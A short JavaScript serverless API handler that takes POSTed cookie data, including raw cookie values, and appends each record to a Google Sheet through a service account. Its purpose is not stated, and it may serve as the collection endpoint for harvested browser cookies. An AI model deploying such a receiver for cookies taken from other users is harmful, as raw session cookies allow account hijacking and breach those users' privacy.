const { GoogleSpreadsheet } = require('google-spreadsheet');

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const cookieData = req.body;
    
    // Initialize the sheet - using your specific Google Sheet ID
    const doc = new GoogleSpreadsheet(process.env.GOOGLE_SHEET_ID);
    
    // Authenticate with Google Sheets
    await doc.useServiceAccountAuth({
      client_email: process.env.GOOGLE_SERVICE_ACCOUNT_EMAIL,
      private_key: process.env.GOOGLE_PRIVATE_KEY.replace(/\\n/g, '\n'),
    });
    
    await doc.loadInfo();
    const sheet = doc.sheetsByIndex[0]; // Using the first sheet
    
    // Add headers if sheet is empty
    if (sheet.rowCount === 0) {
      await sheet.setHeaderRow(['Timestamp', 'Cookie Name', 'Raw Cookie', 'Parsed Data']);
    }
    
    // Add the cookie data to the sheet
    await sheet.addRow({
      'Timestamp': cookieData.timestamp,
      'Cookie Name': cookieData.cookieName,
      'Raw Cookie': cookieData.raw,
      'Parsed Data': JSON.stringify(cookieData.parsed)
    });
    
    res.status(200).json({ message: 'Cookie stored successfully' });
  } catch (error) {
    console.error('Error storing cookie:', error);
    res.status(500).json({ error: 'Failed to store cookie' });
  }
}
